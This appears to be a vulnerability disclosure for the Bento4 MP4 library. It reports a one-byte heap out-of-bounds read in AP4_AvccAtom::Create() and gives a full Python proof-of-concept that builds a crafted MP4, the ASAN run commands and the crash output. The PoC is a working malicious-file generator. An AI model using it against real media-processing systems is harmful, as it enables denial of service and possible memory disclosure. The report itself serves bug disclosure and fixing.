## Bug0: Heap Out-of-Bounds Read in AP4_AvccAtom::Create() via Zero-Payload avcC Box

In `AP4_AvccAtom::Create()` (`Ap4AvccAtom.cpp`, line 75), the code dereferences `payload[0]` on a zero-byte heap buffer before the `payload_size < 6` guard at line 80 is reached, causing a one-byte heap out-of-bounds read when an `avcC` box with `size=8` (no payload) is parsed.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def box(t, data=b''):
    return struct.pack('>I4s', 8 + len(data), t.encode('latin1')) + data

def full_box(t, version, flags, data=b''):
    vf = struct.pack('>I', (version << 24) | (flags & 0xFFFFFF))
    return box(t, vf + data)

# avcC box: size=8, NO payload
# AP4_AvccAtom::Create(size=8): payload_size=0, allocates 0-byte buffer,
# then reads payload[0] unconditionally before the size guard => OOB read
avcc = box('avcC', b'')  # 8 bytes total

avc1_fields = (
    b'\x00' * 6 +
    struct.pack('>H', 1) +
    struct.pack('>HH', 0, 0) +
    b'\x00' * 12 +
    struct.pack('>HH', 320, 240) +
    struct.pack('>II', 0x00480000, 0x00480000) +
    struct.pack('>I', 0) +
    struct.pack('>H', 1) +
    b'\x00' * 32 +
    struct.pack('>H', 0x0018) +
    struct.pack('>h', -1)
)
avc1 = box('avc1', avc1_fields + avcc)

stsd = box('stsd', struct.pack('>II', 0, 1) + avc1)

stts = full_box('stts', 0, 0, struct.pack('>I', 0))
stsc = full_box('stsc', 0, 0, struct.pack('>I', 0))
stsz = full_box('stsz', 0, 0, struct.pack('>II', 0, 0))
stco = full_box('stco', 0, 0, struct.pack('>I', 0))

stbl = box('stbl', stsd + stts + stsc + stsz + stco)

vmhd = full_box('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)
url_ = full_box('url ', 0, 1)
dref = full_box('dref', 0, 0, struct.pack('>I', 1) + url_)
dinf = box('dinf', dref)
minf = box('minf', vmhd + dinf + stbl)

mdhd = full_box('mdhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) + struct.pack('>HH', 0, 0))
hdlr = full_box('hdlr', 0, 0,
    struct.pack('>I', 0) + b'vide' + b'\x00' * 12 + b'\x00')
mdia = box('mdia', mdhd + hdlr + minf)

identity = struct.pack('>IIIIIIIII',
    0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000)
tkhd = full_box('tkhd', 0, 3,
    struct.pack('>IIIII', 0, 0, 1, 0, 0) + b'\x00' * 8 +
    struct.pack('>hhhh', 0, 0, 0, 0) + identity + struct.pack('>II', 0, 0))
trak = box('trak', tkhd + mdia)

mvhd = full_box('mvhd', 0, 0,
    struct.pack('>IIII', 0, 0, 1000, 0) +
    struct.pack('>I', 0x00010000) +
    struct.pack('>H', 0x0100) +
    b'\x00' * 10 + identity + b'\x00' * 24 +
    struct.pack('>I', 2))
moov = box('moov', mvhd + trak)

ftyp = box('ftyp', b'isom' + struct.pack('>I', 0) + b'isom')
mp4 = ftyp + moov

with open('poc_input.mp4', 'wb') as f:
    f.write(mp4)
print(f"[+] poc_input.mp4 written: {len(mp4)} bytes")
print("[+] avcC payload_size=0 -> OOB read at payload[0] in AP4_AvccAtom::Create()")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000116 at pc 0x55b4e180eb75 bp 0x7fffdd9e1cf0 sp 0x7fffdd9e1ce0
READ of size 1 at 0x502000000116 thread T0
    #0 0x55b4e180eb74 in AP4_AvccAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0x9fab74)
    #1 0x55b4e17e61e1 in AP4_AtomFactory::CreateAtomFromStream(AP4_ByteStream&, unsigned int, unsigned int, unsigned long long, AP4_Atom*&) (mp42aac+0x9d21e1)

### Impact

An attacker who supplies a crafted MP4 file with a zero-payload `avcC` box can trigger a one-byte heap out-of-bounds read, exposing one byte of adjacent heap memory that may belong to a neighboring allocation and could aid in information disclosure or ASLR bypass. The vulnerable code path is reached during routine MP4 parsing, so any invocation of mp42aac on an untrusted input file is sufficient to trigger the bug without any authentication or privileges. At minimum this causes a process abort under ASAN and a reliable denial of service in production builds.
